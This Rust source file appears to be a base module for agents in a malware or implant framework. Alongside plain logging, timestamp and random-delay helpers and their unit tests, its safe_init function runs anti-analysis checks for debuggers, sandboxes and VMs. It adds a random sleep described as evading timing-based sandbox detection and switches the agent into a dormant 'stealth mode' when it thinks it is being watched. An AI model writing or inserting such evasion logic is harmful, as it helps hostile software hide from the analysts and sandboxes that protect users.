pub fn init_logging(agent_name: &str) {
    tracing_subscriber::fmt()
        .with_target(false)
        .with_env_filter(
            tracing_subscriber::EnvFilter::from_default_env()
                .add_directive(format!("{}=debug", agent_name).parse().unwrap())
                .add_directive("agent_base=info".parse().unwrap()),
        )
        .init();
}

/// Initialize agent with anti-analysis checks.
/// Returns false if the environment appears dangerous (debugger, sandbox, VM).
/// If unsafe, the agent can choose to lie dormant or use conservative behavior.
pub fn safe_init(agent_name: &str) -> bool {
    init_logging(agent_name);

    // Random delay to evade timing-based sandbox detection
    let delay = random_delay(1, 10);
    std::thread::sleep(std::time::Duration::from_secs(delay));

    // Run anti-analysis
    let safe = crate::anti_analysis::AntiAnalysis::is_safe();
    if !safe {
        tracing::warn!("{}: unsafe environment detected, operating in stealth mode", agent_name);
    } else {
        tracing::info!("{}: environment appears safe", agent_name);
    }

    safe
}

pub fn timestamp_now() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs()
}

pub fn random_delay(min_secs: u64, max_secs: u64) -> u64 {
    use rand::Rng;
    let mut rng = rand::thread_rng();
    rng.gen_range(min_secs..=max_secs)
}


#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_timestamp_now_is_recent() {
        let ts = timestamp_now();
        // Should be after 2024
        assert!(ts > 1700000000, "Timestamp should be after 2024");
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs();
        // Should be within last 5 seconds
        assert!(now - ts <= 5, "Timestamp should be current");
        assert!(ts <= now, "Timestamp should not be in the future");
    }

    #[test]
    fn test_random_delay_range() {
        for _ in 0..100 {
            let delay = random_delay(1, 10);
            assert!(delay >= 1, "delay too small: {}", delay);
            assert!(delay <= 10, "delay too large: {}", delay);
        }
    }

    #[test]
    fn test_random_delay_same_min_max() {
        let delay = random_delay(5, 5);
        assert_eq!(delay, 5);
    }

    #[test]
    fn test_timestamp_monotonic() {
        let ts1 = timestamp_now();
        std::thread::sleep(std::time::Duration::from_millis(100));
        let ts2 = timestamp_now();
        assert!(ts2 >= ts1, "Timestamp should be monotonic");
    }
}
